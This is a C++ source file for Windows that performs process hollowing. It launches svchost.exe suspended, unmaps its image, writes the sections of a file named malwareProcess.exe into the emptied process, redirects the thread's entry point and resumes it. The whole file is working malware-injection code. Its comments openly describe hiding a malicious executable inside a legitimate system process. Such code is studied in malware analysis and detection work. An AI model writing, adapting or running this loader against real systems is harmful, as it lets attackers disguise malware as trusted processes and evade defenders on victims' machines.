#include<Windows.h>
#include<stdio.h>
#include<iostream>
#pragma comment(lib, "ntdll.lib")
using namespace std;

typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);


int main() {

	LPSTARTUPINFOA target_si = new STARTUPINFOA();
	LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION();
	CONTEXT c;


	//#########################################################################
	//create Target image for hollowing
	if (CreateProcessA(
		(LPSTR)"C:\\Windows\\System32\\svchost.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		target_si,
		target_pi) == 0) {
		cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
		return 1;
	}


	//#########################################################################
	// get handle to Malicious program
	HANDLE hMaliciousCode = CreateFileA(
		(LPCSTR)"C:\\Users\\ryan\\Desktop\\repos\\MalwareProcess\\Debug\\malwareProcess.exe",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	cout << "[+] Process PID-> 0x" << target_pi->dwProcessId << endl;

	if (hMaliciousCode == INVALID_HANDLE_VALUE) {
		cout << "[!] Failed to open Malicious file: " << GetLastError()<<endl;
		TerminateProcess(target_pi->hProcess, 0);
	}
	cout << "[+] Malicious file opened." << endl;


	//#########################################################################
	//Get size of Malicious process in bytes to use in Virtual Alloc
	DWORD maliciousFileSize = GetFileSize(hMaliciousCode, 0);
	cout << "[+] Malicious file size: " << maliciousFileSize << " bytes." << endl;


	//#########################################################################
	//Allocate memory for Malicious process
	PVOID pMaliciousImage = VirtualAlloc(
		NULL,
		maliciousFileSize,
		0x3000,
		0x04
	);


	//#########################################################################
	//Read Malicious exe and write into allocated memory with ReadFile()
	DWORD numberOfBytesRead;

	if (!ReadFile(
		hMaliciousCode,
		pMaliciousImage,
		maliciousFileSize,
		&numberOfBytesRead,
		NULL
		)) {
		cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
		TerminateProcess(target_pi->hProcess, 0);
		return 1;
	}

	CloseHandle(hMaliciousCode);
	cout << "[+] Read malicious exe into memory at: 0x" << pMaliciousImage << endl;


	//#########################################################################
	//get thread context to access register values EAX, EBX 
	c.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(target_pi->hThread, &c);

	//Find base address of Target process
	PVOID pTargetImageBaseAddress;
	ReadProcessMemory(
		target_pi->hProcess,
		(PVOID)(c.Ebx + 8),
		&pTargetImageBaseAddress,
		sizeof(PVOID),
		0
	);
	cout << "[+] Target Image Base Address : 0x" << pTargetImageBaseAddress << endl;


	//#########################################################################
	//Hollow process 
	HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");


	DWORD dwResult = pZwUnmapViewOfSection(target_pi->hProcess, pTargetImageBaseAddress);
	if (dwResult) {
		cout << "[!] Unmapping failed." << endl;
		TerminateProcess(target_pi->hProcess, 1);
		return 1;
	}

	//cout << "Result: " << dwResult << endl;
	cout << "[+] Process successfully hollowed at Image Base: 0x"<<pTargetImageBaseAddress<< endl;


	//#########################################################################
	//get Malicious image size from NT Headers
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew);

	DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;
	
	cout << "[+] Malicious Image Base Address: 0x"<<pNTHeaders->OptionalHeader.ImageBase<<endl;
	

	PVOID pHollowAddress = VirtualAllocEx(
		target_pi->hProcess,
		pTargetImageBaseAddress,
		sizeOfMaliciousImage,
		0x3000,
		0x40
	);
	if (pHollowAddress == NULL) {
		cout << "[!] Memory allocation in target process failed. Error: "<<GetLastError() << endl;
		TerminateProcess(target_pi->hProcess, 0);
		return 1;
	}

	cout << "[+] Memory allocated in target at: 0x" << pHollowAddress << endl;


	//#########################################################################
	//write malicious PE headers into target
	if (!WriteProcessMemory(
		target_pi->hProcess,
		pTargetImageBaseAddress,
		pMaliciousImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		NULL
	)) {
		cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
	}
	cout << "[+] Headers written to memory." << endl;
	

	//#########################################################################
	//write malicious PE sections into target
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		WriteProcessMemory(
			target_pi->hProcess,
			(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			NULL
		);
		//cout << "[+] Section: " << pSectionHeader->Name <<" written to memory."<< endl;
	}
	cout << "[+] Sections written to memory." << endl;


	//#########################################################################
	//change victim entry point (EAX thread context) to malicious entry point & resume thread
	c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	SetThreadContext(target_pi->hThread, &c);
	ResumeThread(target_pi->hThread);

	system("pause");
	TerminateProcess(target_pi->hProcess, 0);

	return 0;

}